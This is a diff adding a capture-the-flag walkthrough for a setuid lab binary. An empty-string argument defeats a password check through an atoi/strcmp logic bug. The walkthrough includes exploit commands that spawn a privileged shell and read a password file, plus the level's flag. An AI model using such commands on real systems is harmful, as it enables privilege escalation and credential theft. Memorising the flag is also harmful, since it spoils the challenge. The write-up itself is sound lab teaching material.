@@ -1,0 +1,71 @@
+# bonus3 Walkthrough
+
+## Vulnerability: Logic Bug — `atoi("")` = 0 truncates buf to empty string
+
+### Binary Analysis
+
+```c
+int main(int argc, char **argv)
+{
+    FILE *f   = fopen("/home/user/end/.pass", "r");
+    char buf[132];
+
+    memset(buf, 0, sizeof(buf));
+    if (!f || argc != 2) return -1;
+
+    fread(buf, 1, 66, f);           // read first 66 bytes of password → buf[0..65]
+    buf[65] = '\0';                  // hard null-terminate
+
+    buf[atoi(argv[1])] = '\0';      // LOGIC BUG: null-terminate at user-chosen offset
+
+    fread(buf + 66, 1, 65, f);      // read next 65 bytes → buf[66..130]
+    fclose(f);
+
+    if (strcmp(buf, argv[1]) == 0)  // compare buf with argv[1]
+        execl("/bin/sh", "sh", NULL);
+    else
+        puts(buf + 66);
+}
+```
+
+### Exploit Logic
+
+The programmer's intent was to compare the password read from file against the
+user's guess in `argv[1]`. The fatal flaw is the line:
+
+```c
+buf[atoi(argv[1])] = '\0';
+```
+
+When `argv[1] = ""` (empty string):
+
+| Step | Value |
+|------|-------|
+| `atoi("")` | `0` |
+| `buf[0] = '\0'` | buf is now `""` (empty string) |
+| `strcmp("", "")` | `0` (equal) |
+| Result | `execl("/bin/sh")` runs with setuid `end` privileges |
+
+No password knowledge needed — just pass an empty string.
+
+### Exploit Command
+
+```bash
+/home/user/bonus3/bonus3 ""
+```
+
+Then from the shell:
+
+```bash
+cat /home/user/end/.pass
+```
+
+### One-liner
+
+```bash
+echo 'cat /home/user/end/.pass' | /home/user/bonus3/bonus3 ""
+```
+
+### Flag
+
+`3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c`
